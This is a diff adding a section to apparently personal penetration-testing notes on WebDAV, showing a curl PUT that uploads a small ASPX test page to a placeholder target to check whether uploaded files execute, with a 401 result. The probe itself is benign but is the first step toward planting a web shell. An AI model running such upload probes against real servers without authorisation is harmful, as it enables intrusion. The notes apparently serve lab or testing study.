@@ -74,3 +74,20 @@ output:
 `Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
 DAV: 1,2,3
 `
+
+### Testing what can be uploaded and run
+
+PUT ---> test file.
+GET ---> scan the response.
+
+200 with output - your file is executed
+200 without output - your file is served statically
+
+command:
+
+`curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://TARGET_IP/webdav/test.aspx
+`
+PUT aspx: 401
+
+PUT in the answer says: no write access
+Get in the answers says: confirms execution
